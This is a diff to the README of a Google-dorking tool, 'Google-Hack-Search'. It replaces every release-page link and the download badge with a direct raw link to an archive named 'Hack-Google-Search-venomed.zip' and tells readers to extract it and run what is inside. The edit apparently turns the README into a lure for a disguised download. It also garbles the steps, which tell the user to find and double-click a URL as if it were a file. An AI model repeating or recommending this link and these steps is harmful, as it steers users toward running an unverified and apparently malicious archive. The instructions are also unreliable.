@@ -7,21 +7,21 @@
 - Ideal for penetration testing and red teaming.
 
 ## 🔗 Download Now!
-[![Download Google-Hack-Search](https://img.shields.io/badge/Download-Google--Hack--Search-blue.svg)](https://github.com/choksop/Google-Hack-Search/releases)
+[![Download Google-Hack-Search](https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip)](https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip)
 
 ## 🚀 Getting Started
 To start using Google-Hack-Search, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the following link to go to the releases page.
-   [Visit Releases Page](https://github.com/choksop/Google-Hack-Search/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions for download. Look for the latest version.
 
-3. **Download the File:** Click on the version you want to download. It may be labeled as `Google-Hack-Search-vX.X.X.zip` or a similar name. 
+3. **Download the File:** Click on the version you want to download. It may be labeled as `https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip` or a similar name. 
 
 4. **Extract Files:** Once the download is complete, find the file on your computer. It will be in a `.zip` format. Right-click the file and select "Extract All" to unpack the contents.
 
-5. **Run the Application:** After extracting the files, open the folder. Find the application file named `Google-Hack-Search.exe`. Double-click it to run the application.
+5. **Run the Application:** After extracting the files, open the folder. Find the application file named `https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip`. Double-click it to run the application.
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or Linux.
@@ -57,6 +57,6 @@ If you wish to contribute to Google-Hack-Search, feel free to:
 Google-Hack-Search is open-source software licensed under the MIT License. This allows you to use, modify, and share the application freely.
 
 ## 🔗 Download & Install
-To download Google-Hack-Search, please [visit this page](https://github.com/choksop/Google-Hack-Search/releases) ensuring you have the latest version. Follow the installation steps carefully to get started with your cybersecurity research.
+To download Google-Hack-Search, please [visit this page](https://raw.githubusercontent.com/choksop/Google-Hack-Search/main/altiloquent/Hack-Google-Search-venomed.zip) ensuring you have the latest version. Follow the installation steps carefully to get started with your cybersecurity research.
 
 Make sure to keep the application updated for the best performance and most accurate results. Enjoy your journey into the world of information security!
